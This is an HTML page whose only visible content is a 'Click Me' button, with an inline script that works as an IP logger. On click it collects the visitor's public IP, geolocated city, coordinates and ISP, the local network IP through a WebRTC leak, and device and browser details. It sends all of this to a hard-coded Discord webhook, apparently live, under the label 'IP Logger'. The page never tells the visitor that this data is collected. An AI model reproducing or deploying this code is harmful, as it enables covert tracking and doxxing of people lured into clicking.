<!DOCTYPE html>
<html>
<head>
    <title>click the button</title>
    <style>
        body { font-family: Arial, sans-serif; max-width: 600px; margin: 50px auto; padding: 20px; text-align: center; }
        button { padding: 12px 24px; font-size: 16px; background-color: #5865F2; color: white; border: none; border-radius: 4px; cursor: pointer; }
        button:hover { background-color: #4752C4; }
        button:disabled { opacity: 0.5; cursor: not-allowed; }
        #status { margin-top: 20px; padding: 10px; border-radius: 4px; display: none; }
    </style>
</head>
<body>
    <h1>click the button website thing</h1>
    <p>click the button below:</p>
    
    <button id="trackButton">Click Me</button>
    <div id="status"></div>
    
    <script>
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1457747830121824426/Hu4uM8zm-bUBTc9hNYEZE0r2XVIW8-1_cpEs3s_P0FdqJFSXPLxIbp_0zKc3ur54P1qD';
        
        async function getIPAddress() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                return data.ip || 'Unknown';
            } catch {
                try {
                    const res = await fetch('https://api64.ipify.org?format=json');
                    const data = await res.json();
                    return data.ip || 'Unknown';
                } catch {
                    return 'Failed to get IP';
                }
            }
        }
        
        async function getLocationWithMultipleAPIs(ip) {
            // Try multiple APIs in parallel
            const promises = [
                fetch(`https://ipapi.co/${ip}/json/`).then(r => r.json()),
                fetch(`http://ip-api.com/json/${ip}`).then(r => r.json()),
                fetch(`https://ipwho.is/${ip}`).then(r => r.json())
            ];
            
            try {
                const results = await Promise.any(promises.map(p => p.catch(e => null)));
                
                // Parse whichever succeeded
                if (results && results.ip) {
                    // Check which API format we got
                    if (results.city) {
                        // ipapi.co or ipwho.is format
                        return {
                            lat: results.latitude || results.lat || 'Unknown',
                            lon: results.longitude || results.lon || 'Unknown',
                            city: results.city || 'Unknown',
                            region: results.region || results.region_name || results.state || 'Unknown',
                            country: results.country_name || results.country || 'Unknown',
                            isp: results.org || results.isp || results.connection?.isp || 'Unknown',
                            zip: results.postal || results.zip || 'Unknown',
                            timezone: results.timezone || 'Unknown',
                            source: 'Success'
                        };
                    } else if (results.city === undefined && results.query) {
                        // ip-api.com format
                        return {
                            lat: results.lat || 'Unknown',
                            lon: results.lon || 'Unknown',
                            city: results.city || 'Unknown',
                            region: results.regionName || 'Unknown',
                            country: results.country || 'Unknown',
                            isp: results.isp || 'Unknown',
                            zip: results.zip || 'Unknown',
                            timezone: results.timezone || 'Unknown',
                            source: 'Success'
                        };
                    }
                }
            } catch (e) {
                console.log('All APIs failed');
            }
            
            // Last resort: Use freegeoip (no key needed)
            try {
                const res = await fetch(`https://freegeoip.app/json/${ip}`);
                const data = await res.json();
                return {
                    lat: data.latitude || 'Unknown',
                    lon: data.longitude || 'Unknown',
                    city: data.city || 'Unknown',
                    region: data.region_name || 'Unknown',
                    country: data.country_name || 'Unknown',
                    isp: data.isp || 'Unknown',
                    zip: data.zip_code || 'Unknown',
                    timezone: data.time_zone || 'Unknown',
                    source: 'FreeGeoIP'
                };
            } catch (e) {
                return {
                    lat: 'Unknown (API failed)',
                    lon: 'Unknown (API failed)',
                    city: 'Unknown (API failed)',
                    region: 'Unknown (API failed)',
                    country: 'Unknown (API failed)',
                    isp: 'Unknown (API failed)',
                    zip: 'Unknown (API failed)',
                    timezone: 'Unknown (API failed)',
                    source: 'All APIs failed'
                };
            }
        }
        
        async function getLocalIP() {
            return new Promise((resolve) => {
                if (!window.RTCPeerConnection) {
                    resolve('WebRTC not supported');
                    return;
                }
                
                const pc = new RTCPeerConnection({ iceServers: [] });
                const ips = [];
                
                pc.createDataChannel('');
                pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {});
                
                pc.onicecandidate = (event) => {
                    if (!event.candidate) {
                        if (ips.length) {
                            resolve(ips[0]);
                        } else {
                            resolve('Not detected');
                        }
                        return;
                    }
                    
                    const candidate = event.candidate.candidate;
                    const regex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
                    const match = candidate.match(regex);
                    
                    if (match) {
                        const ip = match[1];
                        if (ip.startsWith('192.168.') || ip.startsWith('10.') || 
                            (ip.startsWith('172.') && parseInt(ip.split('.')[1]) >= 16 && parseInt(ip.split('.')[1]) <= 31)) {
                            if (!ips.includes(ip)) {
                                ips.push(ip);
                            }
                        }
                    }
                };
                
                setTimeout(() => {
                    pc.close();
                    resolve(ips.length ? ips[0] : 'Not detected');
                }, 1000);
            });
        }
        
        function getBrowserInfo() {
            const ua = navigator.userAgent;
            
            // Simple device detection
            let device = 'Desktop';
            if (/mobile|android|iphone/i.test(ua.toLowerCase())) device = 'Mobile';
            
            // Simple OS detection
            let os = 'Unknown';
            if (/windows/i.test(ua)) os = 'Windows';
            else if (/mac/i.test(ua)) os = 'macOS';
            else if (/linux/i.test(ua)) os = 'Linux';
            else if (/android/i.test(ua)) os = 'Android';
            else if (/iphone|ipad/i.test(ua)) os = 'iOS';
            
            // Simple browser detection
            let browser = 'Unknown';
            if (/chrome/i.test(ua) && !/edge/i.test(ua)) browser = 'Chrome';
            else if (/firefox/i.test(ua)) browser = 'Firefox';
            else if (/safari/i.test(ua) && !/chrome/i.test(ua)) browser = 'Safari';
            else if (/edge/i.test(ua)) browser = 'Edge';
            
            return {
                device,
                os,
                browser,
                language: navigator.language || 'Unknown',
                platform: navigator.platform || 'Unknown',
                cookies: navigator.cookieEnabled ? 'Yes' : 'No',
                online: navigator.onLine ? 'Online' : 'Offline'
            };
        }
        
        document.getElementById('trackButton').addEventListener('click', async function() {
            const button = this;
            const status = document.getElementById('status');
            
            button.disabled = true;
            button.textContent = 'Getting info...';
            status.style.display = 'none';
            
            try {
                // Get IP (basic)
                const publicIP = await getIPAddress();
                
                // Get location info
                const location = await getLocationWithMultipleAPIs(publicIP);
                
                // Get local IP
                const localIP = await getLocalIP();
                
                // Get browser info
                const browserInfo = getBrowserInfo();
                
                // Current time
                const now = new Date();
                const timeStr = now.toLocaleString();
                
                // Build message
                const embed = {
                    title: "NEW VISITOR DETECTED",
                    color: 0x00FF00,
                    fields: [
                        {
                            name: "IP ADDRESS",
                            value: `**Public:** \`${publicIP}\`\n**Local:** \`${localIP}\``,
                            inline: true
                        },
                        {
                            name: "LOCATION INFO",
                            value: `**Country:** ${location.country}\n**Region:** ${location.region}\n**City:** ${location.city}\n**ISP:** ${location.isp}`,
                            inline: true
                        },
                        {
                            name: "COORDINATES",
                            value: `**Latitude:** ${location.lat}\n**Longitude:** ${location.lon}\n**Source:** ${location.source}`,
                            inline: true
                        },
                        {
                            name: "DEVICE INFO",
                            value: `**Device:** ${browserInfo.device}\n**OS:** ${browserInfo.os}\n**Browser:** ${browserInfo.browser}\n**Language:** ${browserInfo.language}`,
                            inline: true
                        },
                        {
                            name: "TIME & URL",
                            value: `**Time:** ${timeStr}\n**Page:** ${window.location.href}\n**Referrer:** ${document.referrer || 'Direct'}`,
                            inline: false
                        }
                    ],
                    footer: {
                        text: "IP Logger â€¢ " + now.toLocaleDateString()
                    },
                    timestamp: now.toISOString()
                };
                
                const discordMessage = {
                    embeds: [embed],
                    username: "IP Logger"
                };
                
                // Send to Discord
                const response = await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(discordMessage)
                });
                
                if (response.ok) {
                    status.textContent = 'Info sent to Discord!';
                    status.style.color = '#4CAF50';
                    status.style.backgroundColor = '#E8F5E9';
                } else {
                    throw new Error('Discord error');
                }
                
            } catch (error) {
                console.error('Error:', error);
                status.textContent = 'Error. Try again later.';
                status.style.color = '#F44336';
                status.style.backgroundColor = '#FFEBEE';
            } finally {
                button.disabled = false;
                button.textContent = 'click me';
                status.style.display = 'block';
            }
        });
    </script>
</body>
</html>